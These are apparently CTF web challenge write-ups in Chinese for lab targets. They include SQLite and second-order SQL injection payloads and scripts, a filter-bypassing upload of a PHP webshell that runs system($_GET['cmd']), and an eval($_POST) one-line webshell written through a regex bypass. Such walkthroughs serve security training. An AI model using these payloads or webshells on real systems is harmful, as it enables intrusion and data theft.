<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</span><br></pre></td></tr></table></figure>
<p>不断中奖，在中奖是$money的值也会提高</p>
<p>在$money超过$flag_money后，可以修改action为flag，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;9491ec43e58eb3d07479508a0c48781e&#125;</span><br></pre></td></tr></table></figure>
<h1 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a>FlatScience</h1><p>考察：代码审计，sqlite注入，爬虫、python的pdfminer库</p>
<p>首先进入页面，大概就是在不同的目录下载论文的功能。</p>
<p>使用御剑进行扫描，存在admin.php和login.php，分别登陆</p>
<p>尝试用sqlmap进行注入，时间过长 ，放弃</p>
<p>查看网页源代码，在login.php中存在以下注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- TODO: Remove ?debug-Parameter! --&gt;</span><br></pre></td></tr></table></figure>
<p>尝试访问url</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;220.249.52.134:40279&#x2F;login.php?debug</span><br></pre></td></tr></table></figure>
<p>获得源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 4.01&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">blockquote &#123; background: #eeeeee; &#125;</span><br><span class="line">h1 &#123; border-bottom: solid black 2px; &#125;</span><br><span class="line">h2 &#123; border-bottom: solid black 1px; &#125;</span><br><span class="line">.comment &#123; color: darkgreen; &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;iso-8859-1&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div align&#x3D;right class&#x3D;lastmod&gt;</span><br><span class="line">Last Modified: Fri Mar  31:33:7 UTC 1337</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;h1&gt;Login&lt;&#x2F;h1&gt;</span><br><span class="line">Login Page, do not try to hax here plox!&lt;br&gt;</span><br><span class="line">&lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">  ID:&lt;br&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;usr&quot;&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  Password:&lt;br&gt; </span><br><span class="line">  &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;pw&quot;&gt;</span><br><span class="line">  &lt;br&gt;&lt;br&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_POST[&#39;usr&#39;]) &amp;&amp; isset($_POST[&#39;pw&#39;]))&#123;</span><br><span class="line">        $user &#x3D; $_POST[&#39;usr&#39;];</span><br><span class="line">        $pass &#x3D; $_POST[&#39;pw&#39;];</span><br><span class="line">        $db &#x3D; new SQLite3(&#39;..&#x2F;fancy.db&#39;);</span><br><span class="line">        $res &#x3D; $db-&gt;query(&quot;SELECT id,name from Users where name&#x3D;&#39;&quot;.$user.&quot;&#39; and password&#x3D;&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;&quot;);</span><br><span class="line">    if($res)&#123;</span><br><span class="line">        $row &#x3D; $res-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&lt;br&gt;Some Error occourred!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    if(isset($row[&#39;id&#39;]))&#123;</span><br><span class="line">            setcookie(&#39;name&#39;,&#39; &#39;.$row[&#39;name&#39;], time() + 60, &#39;&#x2F;&#39;);</span><br><span class="line">            header(&quot;Location: &#x2F;&quot;);</span><br><span class="line">            die();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获得信息有：数据库为sqlite；在name处注入（即usr变量），会在setcookie中呈现相应结果</p>
<p>分别post以下参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usr&#x3D;&#39; union order by 3--+&amp;pw&#x3D;123</span><br><span class="line">usr&#x3D;&#39; union select name,sql from sqlite_master--+&amp;pw&#x3D;123</span><br><span class="line">usr&#x3D;&#39; union select 1,group_concat(name) from users --+&amp;pw&#x3D;123</span><br><span class="line">usr&#x3D;&#39; union select 1,password from users where name&#x3D;admin--+&amp;pw&#x3D;123</span><br><span class="line">usr&#x3D;&#39; union select 1,group_concat(hint) from users--+&amp;pw&#x3D;123</span><br></pre></td></tr></table></figure>
<p>可以得到admin的密码为3fab54a50e770d830c0416df817567662a9dc85c</p>
<p>而hint的内容提示密码在pdf中，</p>
<p>在login.php下，提示密码的构成方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res &#x3D; $db-&gt;query(&quot;SELECT id,name from Users where name&#x3D;&#39;&quot;.$user.&quot;&#39; and password&#x3D;&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;&quot;);</span><br></pre></td></tr></table></figure>
<p>使用python下的pdfminer库读取，找到sha1(str.”Salz!”)后等于admin密码的那一段，即为，这个随便抄一个代码就行</p>
<p>密码为ThinJerboa</p>
<p>进入admin.php，提交密码后得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sqlite小知识"><a href="#sqlite小知识" class="headerlink" title="sqlite小知识"></a>sqlite小知识</h2><p>sql中存在一个sqlite_master表，类似于mysql中的information_schema，拥有字段type/name/tbl_name/rootpage/sql</p>
<h2 id="python爬虫模板"><a href="#python爬虫模板" class="headerlink" title="python爬虫模板"></a>python爬虫模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_file</span>(<span class="params">url, index</span>):</span></span><br><span class="line">    local_filename = index+<span class="string">&#x27;-&#x27;</span>+url.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">    r = requests.get(url, stream=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(local_filename, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size=<span class="number">1024</span>):</span><br><span class="line">            <span class="keyword">if</span> chunk:</span><br><span class="line">                f.write(chunk)</span><br><span class="line">                f.flush</span><br><span class="line">    <span class="keyword">return</span> local_filename</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_url</span>(<span class="params">root_link</span>):</span></span><br><span class="line">    print(root_link)</span><br><span class="line">    r = requests.get(root_link)</span><br><span class="line">    <span class="keyword">if</span> r.status_code==<span class="number">200</span>:</span><br><span class="line">        soup = BeautifulSoup(r.text)</span><br><span class="line">        index = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">            new_link = root_link + link.get(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">            print(<span class="string">&quot;root_link = &quot;</span> + root_link)</span><br><span class="line">            print(<span class="string">&quot;new_link = &quot;</span> + new_link)</span><br><span class="line">            <span class="keyword">if</span> new_link.endswith(<span class="string">&quot;.pdf&quot;</span>):</span><br><span class="line">                print(<span class="string">&quot;debug 1&quot;</span>)</span><br><span class="line">                file_path = download_file(new_link,<span class="built_in">str</span>(index))</span><br><span class="line">                print(<span class="string">&quot;downloading:&quot;</span>+new_link+<span class="string">&quot; -&gt; &quot;</span>+file_path)</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> new_link.endswith(<span class="string">&quot;.html&quot;</span>) <span class="keyword">and</span> new_link != url:</span><br><span class="line">                print(<span class="string">&quot;debug 2&quot;</span>)</span><br><span class="line">                get_url(new_link);</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;error occur&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://220.249.52.134:40279/&quot;</span></span><br><span class="line">    get_url(url)</span><br></pre></td></tr></table></figure>
<h2 id="python-pdfminer的用法"><a href="#python-pdfminer的用法" class="headerlink" title="python pdfminer的用法"></a>python pdfminer的用法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> TextConverter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span>():</span><span class="comment">#打开pdf文件</span></span><br><span class="line">    <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">&quot;./&quot;</span>) <span class="keyword">if</span> i.endswith(<span class="string">&quot;pdf&quot;</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span>(<span class="params">path</span>):</span><span class="comment">#获取pdf文本</span></span><br><span class="line">    rsrcmgr = PDFResourceManager()</span><br><span class="line">    retstr = StringIO()</span><br><span class="line">    device = TextConverter(rsrcmgr, retstr, codec=<span class="string">&#x27;utf-8&#x27;</span>, laparams=LAParams())</span><br><span class="line">    interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.get_pages(fp, <span class="built_in">set</span>()):</span><br><span class="line">            interpreter.process_page(page)</span><br><span class="line">        text = retstr.getvalue()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span>():</span><span class="comment">#读取密码</span></span><br><span class="line">    pdf_path = get_pdf()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line">        <span class="built_in">print</span></span><br><span class="line">        <span class="string">&quot;Searching word in &quot;</span> + i</span><br><span class="line">        pdf_text = convert_pdf_2_text(i).split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">            sha1_password = hashlib.sha1(word + <span class="string">&quot;Salz!&quot;</span>).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> sha1_password == <span class="string">&#x27;3fab54a50e770d830c0416df817567662a9dc85c&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span></span><br><span class="line">                <span class="string">&quot;Find the password :&quot;</span> + word</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    find_password()</span><br></pre></td></tr></table></figure>
<h1 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h1><p>考察：网页提权，文件上传绕过，一句话木马</p>
<p><strong>第一步</strong></p>
<p>登录页面后，有登录、注册、找回密码三个页面。注册一个账号，登录后有主页、管理、个人信息、更改密码、登出五个页面。</p>
<p>点击管理页面，提示只有admin才能登录，因此确定需要通过某种方式登录admin。</p>
<p>尝试每个页面sqlmap跑注入，失败。</p>
<p>修改密码时，用户会短暂提权为root权限。而靶机的修改密码操作为先确认用户信息，再输入新密码。在输入新密码时使用burp抓包，修改用户名为admin，即可修改admin密码。</p>
<p><strong>第二步</strong></p>
<p>以admin用户登录后，点击Manage，提示IP not allowed</p>
<p>添加X-Forwarded-For字段，并设置值为127.0.0.1，提交后能成功登录</p>
<p><strong>第三步</strong></p>
<p>页面显示”where is the flag”</p>
<p>显示页面源码，源码中有注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- index.php?module&#x3D;filemanage&amp;do&#x3D;???--&gt;</span><br></pre></td></tr></table></figure>
<p>多次尝试后，do值为upload时有了新的页面</p>
<p><strong>第四步</strong></p>
<p>页面显示为上传一个图片，很明显是一个文件上传绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upfile&quot;; filename&#x3D;&quot;sqzr.php5&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; highlight_file(__FILE__);system($_GET[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>注意此处进行了三个过滤</p>
<ul>
<li><?php>标签的过滤：php代码也可以用<script langua="php">的方法绕过</li>
<li>php后缀的过滤：可以设置后缀从php2一直到php5</li>
<li>content-type的过滤：设置content-type为image/jpeg</li>
</ul>
<p><strong>最后一步</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;4257116016b10a693f5ed7b0a5effd5e&#125;</span><br></pre></td></tr></table></figure>
<h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>用户在修改密码时，能短暂的拥有root权限。</p>
<h2 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For"></a>X-Forwarded-For</h2><p>后端web server从X-Forward-For中获取client ip，因此可以用于绕过登录server时对主机IP的检测</p>
<h2 id="php代码的第二种表示方法"><a href="#php代码的第二种表示方法" class="headerlink" title="php代码的第二种表示方法"></a>php代码的第二种表示方法</h2><script language="php">


</script>

<h2 id="文件上传时php后缀检测的绕过"><a href="#文件上传时php后缀检测的绕过" class="headerlink" title="文件上传时php后缀检测的绕过"></a>文件上传时php后缀检测的绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phtml，php2，php3，php4，php5</span><br></pre></td></tr></table></figure>
<h1 id="ics07"><a href="#ics07" class="headerlink" title="ics07"></a>ics07</h1><p>考察：php弱等于判断绕过，一句话木马，菜刀</p>
<p><strong>第一步</strong></p>
<p>首先打开网页，只有“项目管理“可以进去</p>
<p>进入后，有一个view-source，打开，有用的部分如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123;</span><br><span class="line">       <span class="variable">$con</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">       <span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       <span class="variable">$filename</span> = <span class="string">&quot;backup/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;Bad file extension&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            chdir(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">           <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">           fwrite(<span class="variable">$f</span>, <span class="variable">$con</span>);</span><br><span class="line">           fclose(<span class="variable">$f</span>);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; floatval(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; substr(<span class="variable">$_GET</span>[id], <span class="number">-1</span>) === <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$id</span> = mysql_real_escape_string(<span class="variable">$_GET</span>[id]);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;select * from cetc007.user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$result</span> = mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="literal">False</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="variable">$result</span>)<span class="keyword">die</span>(<span class="string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span>.<span class="variable">$result</span>-&gt;id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$result</span>-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>第二步</strong></p>
<p>第一段很明显，是上传一个木马，但是需要$_SESSION[‘admin’]是true</p>
<p>第二段若$result是true，则会把$_SESSION[‘admin’]设置为true，则需要绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; floatval(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; substr(<span class="variable">$_GET</span>[id], <span class="number">-1</span>) === <span class="string">&#x27;9&#x27;</span>) </span><br></pre></td></tr></table></figure>
<p>则url为</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.134:55693/index.php?page=1&amp;id=1a9&amp;submit=submit</span><br></pre></td></tr></table></figure>
<p>顺利绕过，页面显示结果</p>
<p>此处陷入误区，在id处尝试sql注入失败</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_45552960&#x2F;article&#x2F;details&#x2F;102777514</span><br><span class="line">代码中使用了mysql_real_escape_string()函数 , 该函数用于转义SQL语句中使用的字符串中的特殊字符 , 防御SQL注入 . 虽然可以利用宽字符注入绕过这个防御机制 , 但是要求目标站点使用GBK编码 . 这些细节信息我都不知道 , 所以想要注入是比较难的</span><br></pre></td></tr></table></figure>


<p><strong>第三步</strong></p>
<p>上传一句话木马，需要绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#39;&#x2F;.+\.ph(p[3457]?|t|tml)$&#x2F;i&#39;, $filename))</span><br></pre></td></tr></table></figure>
<p>发现这段正则只对最后.进行了检查，因此可以通过/.的方式绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;..&#x2F;test.php&#x2F;.&amp;con&#x3D;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>最后一步</strong></p>
<p>菜刀连接<a target="_blank" rel="noopener" href="http://220.249.52.134:55693/uploaded/test.php">http://220.249.52.134:55693/uploaded/test.php</a></p>
<p>找到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;c28c1bc69e1ba8ab132b3dbded9232e4&#125;</span><br></pre></td></tr></table></figure>
<h1 id="unfinish"><a href="#unfinish" class="headerlink" title="unfinish"></a>unfinish</h1><p>考察：sql二次注入，python脚本编写</p>
<p><strong>第一步</strong></p>
<p>登录页面，使用御剑扫描后台，有login.php，register.php两个有效文件</p>
<p>register.php页面注册用户，需要填入email、username、password，以post方式提交</p>
<p>login.php页面登录，需要填入email、password，以post方式提交</p>
<p>登录为index.php页面，能显示用户名username</p>
<p>根据wp：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/R3col/p/12690413.html">https://www.cnblogs.com/R3col/p/12690413.html</a></p>
<p><strong>第二步</strong></p>
<p>尝试使用sqlmap在register.php和login.php上进行注入，均失败</p>
<p><strong>第三步</strong></p>
<p>二次注入脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">register_url = <span class="string">&quot;http://220.249.52.134:54877/register.php&quot;</span></span><br><span class="line">login_url = <span class="string">&quot;http://220.249.52.134:54877/login.php&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	register_data = &#123;</span><br><span class="line">		<span class="string">&quot;email&quot;</span>:<span class="string">&quot;111@123.com%d&quot;</span> % i,</span><br><span class="line">		<span class="string">&quot;username&quot;</span>:<span class="string">&quot;0&#x27; + ascii(substr((select * from flag) from %d for 1))+&#x27;0&quot;</span> % i,</span><br><span class="line">		<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	response_register = requests.post(url=register_url, data=register_data)</span><br><span class="line"></span><br><span class="line">	login_data = &#123;</span><br><span class="line">		<span class="string">&quot;email&quot;</span>:<span class="string">&quot;111@123.com%d&quot;</span> % i,</span><br><span class="line">		<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	response_login = requests.post(url=login_url, data=login_data)</span><br><span class="line">	<span class="comment"># print(response_login.text)</span></span><br><span class="line">	ans = re.search(<span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>, response_login.text)</span><br><span class="line">	print(<span class="built_in">chr</span>(<span class="built_in">int</span>(ans.group(<span class="number">1</span>))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>没解决的问题时email和password会影响结果，不知道为何</p>
<p>得到flag</p>
